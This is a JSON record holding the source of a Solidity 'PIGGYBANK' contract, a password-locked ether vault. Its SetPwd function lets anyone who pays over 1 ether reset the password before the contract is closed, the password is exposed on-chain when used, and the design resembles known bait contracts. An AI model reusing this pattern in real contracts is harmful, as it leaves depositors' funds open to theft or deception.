{
	"Language": "Solidity",
	"Source": "pragma solidity ^0.4.24;\r\n\r\ncontract PIGGYBANK\r\n{\r\n    \r\n    bytes32 hashPwd;\r\n    \r\n    bool isclosed = false;\r\n    \r\n    uint cashOutTime;\r\n    \r\n    address sender;\r\n    \r\n    address myadress;\r\n \r\n    \r\n    \r\n    function CashOut(bytes pass) external payable\r\n    {\r\n        if(hashPwd == keccak256(pass) && now>cashOutTime)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    function CashOut() public payable\r\n    {\r\n        if(msg.sender==myadress && now>cashOutTime)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    \r\n\r\n \r\n    function DebugHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\r\n    \r\n    function SetPwd(bytes32 hash) public payable\r\n    {\r\n        if( (!isclosed&&(msg.value>1 ether)) || hashPwd==0x00)\r\n        {\r\n            hashPwd = hash;\r\n            sender = msg.sender;\r\n            cashOutTime = now;\r\n        }\r\n    }\r\n    \r\n    function SetcashOutTime(uint date) public\r\n    {\r\n        if(msg.sender==sender)\r\n        {\r\n            cashOutTime = date;\r\n        }\r\n    }\r\n    \r\n    function Setmyadress(address _myadress) public\r\n    {\r\n        if(msg.sender==sender)\r\n        {\r\n            myadress = _myadress;\r\n        }\r\n    }\r\n    \r\n    function PwdHasBeenSet(bytes32 hash) public\r\n    {\r\n        if(hash==hashPwd&&msg.sender==sender)\r\n        {\r\n           isclosed=true;\r\n        }\r\n    }\r\n    \r\n    function() public payable{}\r\n    \r\n}",
	"ContractName": "PIGGYBANK",
	"CompilerVersion": "v0.4.24+commit.e67f0147"
}